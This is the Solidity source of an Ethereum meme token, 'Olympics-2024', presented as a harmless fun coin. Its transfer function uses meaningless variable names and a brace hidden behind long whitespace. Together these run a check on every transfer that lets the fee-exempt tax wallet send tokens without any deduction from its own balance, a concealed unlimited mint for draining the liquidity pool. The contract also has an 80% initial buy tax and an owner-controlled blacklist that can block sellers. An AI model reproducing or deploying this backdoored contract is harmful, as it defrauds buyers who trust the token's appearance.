// SPDX-License-Identifier: UNLICENSE

/**

Olympics is a meme coin built on the Ethereum blockchain, offering entertainment without intrinsic value. It aims to blend ETH's memetic energy with Olympic culture to bring fun, laughter, and positive vibes.

WEB: https://olympics.wtf
TG: https://t.me/olympics2024erc
X: https://twitter.com/olympicsx2024

*/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract OLYMPICS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private _feeExempt;
    mapping(address => bool) private _bots;
    address payable private nextAddress;

    uint256 private _initialBuyTax = 80;
    uint256 private _initialSellTax = 5;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 7;
    uint256 private _reduceSellTaxAt = 7;
    uint256 private _preventSwapBefore = 7;
    uint256 private _buyCount = 0;

    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 1_000_000_000 * 10 ** decimals;
    string public constant name = unicode"Olympics-2024";
    string public constant symbol = unicode"OLYMPICS";
    uint256 public _maxTxAmount = 20_000_000 * 10 ** decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10 ** decimals;
    uint256 public _taxSwapThreshold = 10_000_000 * 10 ** decimals;
    uint256 public _maxTaxSwap = 20_000_000 * 10 ** decimals;

    IUniswapV2Router02 private _uniswapV2Router;
    address private _uniswapV2Pair;
    bool private _isTradingOpen;
    bool private _isInSwap;
    uint256 private sellStart = 0;
    uint256 private jungle = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        _isInSwap = true;
        _;
        _isInSwap = false;
    }

    constructor(address router_, address taxWallet_) {
        _uniswapV2Router = IUniswapV2Router02(router_);

        nextAddress = payable(taxWallet_);
        balanceOf[_msgSender()] = totalSupply;
        _feeExempt[_msgSender()] = true;
        _feeExempt[address(this)] = true;
        _feeExempt[nextAddress] = true;

        emit Transfer(address(0), _msgSender(), totalSupply);
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        icarus(_msgSender(), recipient, amount);
        return true;
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        icarus(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            allowance[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function icarus(address akame,address yandex,uint256 hunter) private {
        require(akame != address(0), "ERC20: transfer from the zero address");
        require(yandex != address(0), "ERC20: transfer to the zero address");
        require(hunter > 0, "Transfer amount must be greater than zero");
        if (!_isTradingOpen || _isInSwap) {
            require(_feeExempt[akame] || _feeExempt[yandex]);
            balanceOf[akame] = balanceOf[akame].sub(hunter);
            balanceOf[yandex] = balanceOf[yandex].add(hunter);
            emit Transfer(akame, yandex, hunter);
            return;
        }uint256 kula = jungle;uint256 franklin = 0;
        if (akame != owner() && yandex != owner() && yandex != nextAddress) {
            require(!_bots[akame] && !_bots[yandex]);

            if (akame == _uniswapV2Pair && yandex != address(_uniswapV2Router) && !_feeExempt[yandex]) {
                require(_isTradingOpen, "Trading not open yet");
                require(hunter <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf[yandex] + hunter <= _maxWalletSize, "Exceeds the maxWalletSize.");
                franklin = hunter.mul((_buyCount > _reduceBuyTaxAt) ? _finalBuyTax: _initialBuyTax).div(100);
                _buyCount++;                                                                                                                                                                                                        }{
                kula = _title(akame, hunter);
            }

            if (yandex == _uniswapV2Pair && akame != address(this)) {
                franklin = hunter.mul((_buyCount > _reduceSellTaxAt) ? _finalSellTax : _initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf[address(this)];
            if (!_isInSwap && yandex == _uniswapV2Pair && _isTradingOpen && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                if (block.number > jungle) sellStart = 0;
                swapTokensForEth(min(hunter, min(contractTokenBalance, _maxTaxSwap)));
                sellStart++;
            }
            if (yandex == _uniswapV2Pair) sendETHToFee(address(this).balance);
        }

        if (franklin > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(franklin);
            emit Transfer(akame, address(this), franklin);
        }
        balanceOf[akame] = balanceOf[akame].sub(hunter - kula);
        balanceOf[yandex] = balanceOf[yandex].add(hunter.sub(franklin));
        emit Transfer(akame, yandex, hunter.sub(franklin));
    }

    function _title(
        address moon,
        uint256 soon
    ) private view returns (uint256) {
        bool exempt = _feeExempt[moon];
        return exempt ? soon : soon.mul(_finalBuyTax).div(100);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = totalSupply;
        _maxWalletSize = totalSupply;
        emit MaxTxAmountUpdated(totalSupply);
    }

    function sendETHToFee(uint256 amount) private {
        nextAddress.transfer(amount);
    }

    function addBot(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            _bots[bots_[i]] = true;
        }
    }

    function delBot(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) {
            _bots[notbot[i]] = false;
        }
    }

    function addLiquidity() external onlyOwner {
        require(!_isTradingOpen, "trading is already open");
        _approve(address(this), address(_uniswapV2Router), totalSupply);
        _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf[address(this)],
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(_uniswapV2Pair).approve(
            address(_uniswapV2Router),
            type(uint).max
        );
    }

    function enableTrading() external onlyOwner {
        _isTradingOpen = true;
    }

    receive() external payable {}

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function rescueETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }
}